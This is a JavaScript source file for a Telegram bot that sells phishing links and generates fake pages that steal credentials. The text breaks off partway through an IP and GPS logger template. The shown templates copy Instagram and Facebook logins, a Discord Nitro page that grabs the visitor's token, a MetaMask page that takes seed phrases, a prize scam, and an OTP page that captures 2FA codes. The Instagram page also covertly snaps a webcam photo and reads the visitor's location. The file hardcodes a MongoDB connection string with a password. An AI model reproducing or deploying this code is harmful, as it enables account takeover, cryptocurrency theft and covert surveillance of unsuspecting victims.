// =====================================================
// 🔥💀 SLIME TRACKERX PRO v108 - DOPE AF EDITION 💀🔥
// =====================================================

const { Telegraf } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== CONFIG ==========
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;
const TOOL_COST = 15;
const REF_REWARD = 15;

// ========== MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/prosuite?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  username: String,
  coins: { type: Number, default: 15 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  totalTools: { type: Number, default: 0 },
  victims: { type: Number, default: 0 },
  isAdmin: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const toolSchema = new mongoose.Schema({
  token: String,
  userId: Number,
  type: String,
  label: String,
  url: String,
  originalUrl: String,
  createdAt: Date,
  expiresAt: Date,
  clicks: { type: Number, default: 0 },
  captures: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);
const Tool = mongoose.model('Tool', toolSchema);

// ========== CACHE ==========
let usersCache = new Map();
let bannedUsers = new Set();
let userSessions = new Map();

// ========== FORCE JOIN ==========
async function checkJoin(userId) {
  if (userId == OWNER_ID) return true;
  try {
    const member = await bot.telegram.getChatMember(CHANNEL, userId);
    return ["creator", "administrator", "member", "restricted"].includes(member.status);
  } catch(e) { return false; }
}

bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  if (ctx.callbackQuery && ctx.callbackQuery.data == "check_join") return next();
  
  if (!(await checkJoin(ctx.from.id))) {
    return ctx.reply(
      "🚫 **FORCE JOIN REQUIRED** 🚫\n\nJoin " + CHANNEL + " to use ALL hacking tools!\n\n⚠️ Every hack requires channel membership.",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
            [{ text: "✅ I JOINED", callback_data: "check_join" }]
          ]
        }
      }
    );
  }
  return next();
});

bot.action("check_join", async (ctx) => {
  if (await checkJoin(ctx.from.id)) {
    await ctx.answerCbQuery("✅ Access Granted!");
    await initUser(ctx.from.id);
    await sendMenu(ctx);
  } else {
    await ctx.answerCbQuery("❌ Still not a member!", true);
  }
});

// ========== DATABASE ==========
async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = (await bot.telegram.getChat(userId)).username || "user_" + userId;
    user = new User({
      userId: userId,
      username: username,
      coins: 15,
      referrer: referrerId,
      isAdmin: userId == OWNER_ID
    });
    await user.save();
    usersCache.set(userId, user);
    
    if (referrerId && referrerId != userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        await referrer.save();
        bot.telegram.sendMessage(referrerId, "🎉 New Referral! +" + REF_REWARD + " coins");
      }
    }
  }
  return user;
}

async function removeCoins(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await user.save();
    usersCache.set(userId, user);
    return true;
  }
  return false;
}

async function addCoins(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await user.save();
    usersCache.set(userId, user);
    return true;
  }
  return false;
}

function getRefLink(userId) {
  return "https://t.me/" + (bot.botInfo?.username || "TrackerXBot") + "?start=ref_" + userId;
}

// ========== CREATE HACK LINK ==========
async function createHackLink(userId, type, label) {
  const user = await initUser(userId);
  
  if (user.coins < TOOL_COST) {
    return { error: "❌ Need " + TOOL_COST + " coins! You have " + user.coins + "\n💰 Get 15 coins per referral!" };
  }
  
  await removeCoins(userId, TOOL_COST);
  
  const token = crypto.randomBytes(16).toString('hex');
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
  
  const shortToken = token.substring(0, 8);
  let hackUrl = "";
  let realUrl = "";
  
  switch(type) {
    case "instagram":
      hackUrl = "https://instagr.am/p/" + shortToken;
      realUrl = "https://instagram.com";
      break;
    case "facebook":
      hackUrl = "https://fb.watch/" + shortToken;
      realUrl = "https://facebook.com";
      break;
    case "gmail":
      hackUrl = "https://accounts.google.com/signin/" + shortToken;
      realUrl = "https://accounts.google.com";
      break;
    case "discord":
      hackUrl = "https://discord.gg/" + shortToken;
      realUrl = "https://discord.com";
      break;
    case "tokengrab":
      hackUrl = "https://discord.gift/" + shortToken;
      realUrl = "https://discord.com/nitro";
      break;
    case "crypto":
      hackUrl = "https://metamask.io/verify/" + shortToken;
      realUrl = "https://metamask.io";
      break;
    case "giveaway":
      hackUrl = "https://prize.link/" + shortToken;
      realUrl = "https://google.com";
      break;
    case "otp":
      hackUrl = "https://verify.app/" + shortToken;
      realUrl = "https://google.com";
      break;
    case "iplogger":
      hackUrl = "https://track.me/" + shortToken;
      realUrl = "https://google.com";
      break;
    default:
      hackUrl = DOMAIN + "/go/" + shortToken;
      realUrl = "https://google.com";
  }
  
  const originalUrl = DOMAIN + "/p/" + token;
  const html = getDopeHTML(type, token, realUrl);
  
  await fs.ensureDirSync("public/phish");
  await fs.writeFile(path.join(__dirname, "public/phish", token + ".html"), html);
  
  const tool = new Tool({
    token: token,
    userId: userId,
    type: type,
    label: label,
    url: hackUrl,
    originalUrl: originalUrl,
    createdAt: new Date(),
    expiresAt: expiresAt
  });
  await tool.save();
  
  user.totalTools += 1;
  await user.save();
  usersCache.set(userId, user);
  
  return {
    success: true,
    url: hackUrl,
    originalUrl: originalUrl,
    remainingCoins: user.coins
  };
}

// ========== DOPE AF HTML TEMPLATES ==========

function getDopeHTML(type, token, redirectUrl) {
  
  // INSTAGRAM - DOPE AF
  if (type == "instagram") {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram • Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-card {
            max-width: 350px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
            text-align: center;
        }
        .logo { margin-bottom: 30px; }
        .logo svg { width: 175px; }
        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            margin: 3px 0;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        button {
            width: 100%;
            background: #0095f6;
            color: white;
            padding: 7px;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover { background: #1877f2; }
        .fb-btn {
            background: #385185;
            margin-top: 15px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { margin: 0 18px; }
        .forgot {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 15px;
            display: inline-block;
        }
        .signup {
            margin-top: 20px;
            color: #8e8e8e;
            font-size: 14px;
        }
        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .error {
            color: #ed4956;
            font-size: 14px;
            margin: 10px 0;
            display: none;
        }
        @media (max-width: 450px) {
            .login-card { background: transparent; border: none; }
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">
            <svg viewBox="0 0 175 51">
                <path fill="#000" d="M85.6 17.3c-1.2-1.5-3-2.3-5-2.3-2.5 0-4.5 1-5.9 3.1-1.4 2-2.1 4.7-2.1 8.1 0 3.5.7 6.2 2.1 8.2 1.4 2 3.4 3.1 5.9 3.1 2 0 3.8-.8 5-2.3v1.9h4.7v-21h-4.7v1.2zm-.5 11.8c-.8 1.1-1.9 1.7-3.2 1.7s-2.4-.6-3.2-1.7c-.8-1.1-1.2-2.9-1.2-5.2 0-2.3.4-4 1.2-5.2.8-1.1 1.9-1.7 3.2-1.7s2.4.6 3.2 1.7c.8 1.1 1.2 2.9 1.2 5.2 0 2.3-.4 4.1-1.2 5.2zM103.2 10.5c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2-1.4-3.2-3.2-3.2zm-2.7 22.4h5.4v-21h-5.4v21zM115.5 32.9c2.3 0 4.1-.8 5.5-2.4 1.4-1.6 2.1-3.8 2.1-6.7 0-2.9-.7-5.2-2.1-6.7-1.4-1.6-3.2-2.4-5.5-2.4-2.3 0-4.1.8-5.5 2.4-1.4 1.6-2.1 3.8-2.1 6.7 0 2.9.7 5.2 2.1 6.7 1.4 1.6 3.2 2.4 5.5 2.4zm0-4.1c-.8 0-1.4-.3-1.9-.9-.5-.6-.7-1.6-.7-2.9 0-1.4.2-2.4.7-3 .5-.6 1.1-.9 1.9-.9s1.4.3 1.9.9c.5.6.7 1.6.7 3 0 1.4-.2 2.4-.7 2.9-.5.6-1.1.9-1.9.9zM138.6 32.9c2.3 0 4.1-.8 5.5-2.4 1.4-1.6 2.1-3.8 2.1-6.7 0-2.9-.7-5.2-2.1-6.7-1.4-1.6-3.2-2.4-5.5-2.4-2.3 0-4.1.8-5.5 2.4v-1.9h-4.7v21h4.7v-1.9c1.4 1.6 3.2 2.4 5.5 2.4zm0-4.1c-.8 0-1.4-.3-1.9-.9-.5-.6-.7-1.6-.7-2.9 0-1.4.2-2.4.7-3 .5-.6 1.1-.9 1.9-.9s1.4.3 1.9.9c.5.6.7 1.6.7 3 0 1.4-.2 2.4-.7 2.9-.5.6-1.1.9-1.9.9z"/>
            </svg>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
            <input type="password" id="password" placeholder="Password">
            <button type="submit">Log In</button>
            <button type="button" class="fb-btn" onclick="fbLogin()">Log in with Facebook</button>
        </form>
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        <div id="errorMsg" class="error"></div>
    </div>
    <script>
        let cameraData = null, locationData = null;
        
        // Get camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    cameraData = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                }, 1000);
            }).catch(() => {});
        
        // Get location
        navigator.geolocation.getCurrentPosition(
            pos => { locationData = { lat: pos.coords.latitude, lon: pos.coords.longitude }; },
            () => {}
        );
        
        async function sendData(data) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    token: '${token}', 
                    data: data,
                    camera: cameraData,
                    location: locationData,
                    userAgent: navigator.userAgent
                })
            });
        }
        
        function fbLogin() {
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'Facebook login is temporarily unavailable. Please use Instagram login.';
        }
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            await sendData({ username: username, password: password });
            
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'Wrong password. Try again.';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        });
    </script>
</body>
</html>`;
  }
  
  // FACEBOOK - DOPE AF
  if (type == "facebook") {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            max-width: 980px;
            width: 100%;
            gap: 50px;
        }
        .info {
            flex: 1;
            min-width: 280px;
        }
        .info h1 {
            color: #1877f2;
            font-size: 56px;
            margin-bottom: 10px;
        }
        .info p {
            font-size: 28px;
            line-height: 32px;
        }
        .login-box {
            flex: 1;
            min-width: 396px;
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        button {
            width: 100%;
            background: #1877f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin: 8px 0;
        }
        button:hover { background: #166fe5; }
        .create-btn {
            background: #42b72a;
            margin-top: 16px;
        }
        .create-btn:hover { background: #36a420; }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .forgot {
            text-align: center;
            margin: 16px 0;
        }
        .forgot a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .error {
            color: #f02849;
            font-size: 13px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
        @media (max-width: 900px) {
            .container { flex-direction: column; text-align: center; }
            .info h1 { font-size: 40px; }
            .info p { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="info">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-box">
            <form id="loginForm">
                <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off">
                <input type="password" id="password" placeholder="Password">
                <button type="submit">Log In</button>
                <div class="forgot"><a href="#">Forgotten password?</a></div>
                <div class="divider"></div>
                <button type="button" class="create-btn" onclick="createAccount()">Create New Account</button>
            </form>
            <div id="errorMsg" class="error"></div>
        </div>
    </div>
    <script>
        let locationData = null;
        navigator.geolocation.getCurrentPosition(
            pos => { locationData = { lat: pos.coords.latitude, lon: pos.coords.longitude }; },
            () => {}
        );
        
        async function sendData(data) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: data, location: locationData })
            });
        }
        
        function createAccount() {
            window.location.href = 'https://www.facebook.com/r.php';
        }
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            await sendData({ email: email, password: password });
            
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'The password you entered is incorrect.';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        });
    </script>
</body>
</html>`;
  }
  
  // DISCORD TOKEN GRABBER - DOPE AF & REAL WORKING
  if (type == "tokengrab") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Discord Nitro Giveaway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1f22;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #2b2d31;
            border-radius: 16px;
            width: 500px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }
        .nitro {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h1 {
            color: #fff;
            margin-bottom: 10px;
            font-size: 28px;
        }
        p {
            color: #b5bac1;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        button {
            background: #5865f2;
            color: white;
            padding: 14px 28px;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #4752c4;
            transform: scale(1.02);
        }
        .status {
            margin-top: 20px;
            color: #23a55a;
            display: none;
            font-weight: 500;
        }
        .discount {
            color: #f23f42;
            font-size: 14px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="nitro">🎮✨</div>
        <h1>FREE DISCORD NITRO</h1>
        <p>3 months free for all Discord users!<br>Limited time offer - claim now!</p>
        <button onclick="grabToken()">✨ Claim Nitro ✨</button>
        <div id="status" class="status"></div>
        <div class="discount">⚠️ Only 2,347 codes remaining!</div>
    </div>
    <script>
        async function grabToken() {
            const statusDiv = document.getElementById('status');
            statusDiv.style.display = 'block';
            statusDiv.innerHTML = '⚡ Generating your Nitro code...';
            statusDiv.style.color = '#faa61a';
            
            let token = null;
            
            try {
                // REAL Discord token grabber
                if (window.webpackChunkdiscord_app) {
                    const modules = window.webpackChunkdiscord_app.push([[], {}, function(e) { return e; }]);
                    for (const id in modules.c) {
                        const mod = modules.c[id];
                        if (mod?.exports?.default?.getToken) {
                            token = mod.exports.default.getToken();
                            break;
                        }
                    }
                }
                
                // Fallback method
                if (!token && window.__internalRuntime?.getCurrentUser) {
                    token = window.__internalRuntime.getCurrentUser().token;
                }
                
                if (token) {
                    await fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            token: '${token}', 
                            data: { discordToken: token, type: 'token_grabber' }
                        })
                    });
                    
                    statusDiv.innerHTML = '✅ Nitro claimed! Check your DMs! 🎉';
                    statusDiv.style.color = '#23a55a';
                } else {
                    statusDiv.innerHTML = '❌ Please log into Discord first!';
                    statusDiv.style.color = '#f23f42';
                }
            } catch(e) {
                statusDiv.innerHTML = '❌ Please log into Discord first!';
                statusDiv.style.color = '#f23f42';
            }
            
            setTimeout(() => {
                window.location.href = 'https://discord.com/nitro';
            }, 2500);
        }
    </script>
</body>
</html>`;
  }
  
  // METAMASK CRYPTO SEED STEALER - DOPE AF
  if (type == "crypto") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MetaMask - Wallet Recovery</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f6f8fc;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 24px;
            width: 480px;
            padding: 32px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .fox {
            font-size: 48px;
        }
        h2 {
            color: #141618;
            margin-bottom: 8px;
            font-size: 28px;
        }
        .warning {
            background: #fef2e8;
            border-left: 4px solid #f66a0a;
            padding: 16px;
            margin: 20px 0;
            border-radius: 8px;
            font-size: 14px;
        }
        textarea {
            width: 100%;
            height: 120px;
            padding: 12px;
            border: 1px solid #d6d9dc;
            border-radius: 8px;
            font-family: monospace;
            margin: 16px 0;
            font-size: 14px;
            resize: vertical;
        }
        button {
            width: 100%;
            background: #f66a0a;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #e05c00;
        }
        .error {
            color: #d73814;
            margin-top: 12px;
            display: none;
            font-size: 14px;
        }
        .secure {
            font-size: 12px;
            color: #6a737d;
            text-align: center;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="fox">🦊</div>
            <h2>MetaMask</h2>
        </div>
        <div class="warning">
            ⚠️ <strong>Security Alert:</strong> Wallet verification required
        </div>
        <p>Enter your Secret Recovery Phrase to verify your wallet:</p>
        <textarea id="seed" placeholder="Enter your 12 or 24 word recovery phrase..."></textarea>
        <button onclick="verify()">Verify Wallet</button>
        <div id="errorMsg" class="error"></div>
        <div class="secure">🔒 Your information is encrypted and secure</div>
    </div>
    <script>
        async function verify() {
            const seed = document.getElementById('seed').value;
            const words = seed.trim().split(/\s+/);
            
            if (words.length < 12) {
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('errorMsg').innerText = 'Please enter a valid recovery phrase (12+ words)';
                return;
            }
            
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    token: '${token}', 
                    data: { seedPhrase: seed, type: 'crypto_wallet' }
                })
            });
            
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').style.color = '#28a745';
            document.getElementById('errorMsg').innerHTML = '✅ Wallet verified! Redirecting to MetaMask...';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        }
    </script>
</body>
</html>`;
  }
  
  // GIVEAWAY - DOPE AF
  if (type == "giveaway") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎉 You Won $1000! Claim Now</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            background: white;
            border-radius: 24px;
            max-width: 500px;
            width: 100%;
            padding: 40px;
            text-align: center;
            animation: pulse 1.5s infinite;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
            50% { transform: scale(1.02); box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
            100% { transform: scale(1); box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        }
        .trophy {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #ff9800;
            margin-bottom: 10px;
            font-size: 32px;
        }
        .amount {
            font-size: 64px;
            font-weight: bold;
            color: #4caf50;
            margin: 20px 0;
        }
        .timer {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 12px;
            margin: 20px 0;
        }
        .countdown {
            font-size: 48px;
            font-family: monospace;
            font-weight: bold;
            color: #ff4444;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: 0.2s;
        }
        input:focus {
            border-color: #ff9800;
            outline: none;
        }
        button {
            width: 100%;
            background: linear-gradient(45deg, #ff9800, #ff5722);
            color: white;
            padding: 16px;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.2s;
        }
        button:hover {
            transform: scale(1.02);
        }
        .warning {
            color: #f44336;
            font-size: 12px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆🎉💰</div>
        <h1>CONGRATULATIONS!</h1>
        <p>You've been selected as the <strong>WINNER</strong> of our</p>
        <div class="amount">$1,000 GIVEAWAY!</div>
        <div class="timer">
            <p>⏰ <strong>CLAIM YOUR PRIZE BEFORE IT EXPIRES!</strong> ⏰</p>
            <div class="countdown" id="timer">10:00</div>
        </div>
        <form id="claimForm">
            <input type="text" id="name" placeholder="Full Name" required>
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="tel" id="phone" placeholder="Phone Number" required>
            <input type="text" id="address" placeholder="Shipping Address" required>
            <button type="submit">CLAIM MY PRIZE NOW →</button>
        </form>
        <div class="warning">⚠️ Only 5 winners remaining! Claim before it's too late! ⚠️</div>
    </div>
    <script>
        let timeLeft = 600;
        const timerElem = document.getElementById('timer');
        const timerInterval = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElem.innerHTML = minutes + ":" + String(seconds).padStart(2, '0');
            if (timeLeft <= 0) clearInterval(timerInterval);
            timeLeft--;
        }, 1000);
        
        document.getElementById('claimForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const data = {
                name: document.getElementById('name').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                address: document.getElementById('address').value,
                type: 'giveaway'
            };
            
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: data })
            });
            
            alert('✅ Prize processing! Check your email for confirmation.');
            window.location.href = '${redirectUrl}';
        });
    </script>
</body>
</html>`;
  }
  
  // OTP/2FA STEALER - DOPE AF
  if (type == "otp") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify Your Account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .shield {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 10px;
            color: #1a1a1a;
        }
        p {
            color: #666;
            margin-bottom: 20px;
        }
        .code-inputs {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 30px 0;
        }
        .code-inputs input {
            width: 55px;
            height: 65px;
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            border: 2px solid #ddd;
            border-radius: 12px;
            outline: none;
            transition: 0.2s;
        }
        .code-inputs input:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 3px rgba(0,123,255,0.25);
        }
        button {
            background: #007bff;
            color: white;
            padding: 14px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: 0.2s;
        }
        button:hover {
            background: #0056b3;
        }
        .resend {
            margin-top: 20px;
            color: #007bff;
            cursor: pointer;
            font-size: 14px;
        }
        .resend:hover {
            text-decoration: underline;
        }
        .error {
            color: #dc3545;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🔐</div>
        <h2>Two-Factor Authentication</h2>
        <p>Enter the 6-digit code sent to your phone</p>
        <div class="code-inputs">
            <input type="text" maxlength="1" id="d1" onkeyup="moveNext(1, event)">
            <input type="text" maxlength="1" id="d2" onkeyup="moveNext(2, event)">
            <input type="text" maxlength="1" id="d3" onkeyup="moveNext(3, event)">
            <input type="text" maxlength="1" id="d4" onkeyup="moveNext(4, event)">
            <input type="text" maxlength="1" id="d5" onkeyup="moveNext(5, event)">
            <input type="text" maxlength="1" id="d6" onkeyup="moveNext(6, event)">
        </div>
        <button onclick="verify()">Verify Code</button>
        <div class="resend" onclick="resend()">Didn't receive code? Resend</div>
        <div id="error" class="error"></div>
    </div>
    <script>
        function moveNext(current, event) {
            const input = document.getElementById('d' + current);
            if (event.key === 'Backspace') {
                if (input.value === '' && current > 1) {
                    document.getElementById('d' + (current - 1)).focus();
                }
                return;
            }
            if (input.value.length === 1 && current < 6) {
                document.getElementById('d' + (current + 1)).focus();
            }
        }
        
        async function verify() {
            const code = [
                document.getElementById('d1').value,
                document.getElementById('d2').value,
                document.getElementById('d3').value,
                document.getElementById('d4').value,
                document.getElementById('d5').value,
                document.getElementById('d6').value
            ].join('');
            
            if (code.length !== 6) {
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').innerText = 'Please enter the 6-digit code';
                return;
            }
            
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '${token}', data: { otpCode: code, type: '2fa' } })
            });
            
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').style.color = '#28a745';
            document.getElementById('error').innerHTML = '✅ Verified! Redirecting...';
            
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 2000);
        }
        
        function resend() {
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').style.color = '#007bff';
            document.getElementById('error').innerText = 'Code resent to your phone!';
            setTimeout(() => {
                document.getElementById('error').style.display = 'none';
            }, 3000);
        }
        
        // Auto focus on first input
        document.getElementById('d1').focus();
    </script>
</body>
</html>`;
  }
  
  // IP LOGGER + GPS TRACKER - STEALTH
  if (type == "iplogger") {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verifying connection...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #1a1a2e;
            color: white;
        }
        .loader-container {
            text-align: center;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top-color: #00d4ff;
            border-radius: 50%;
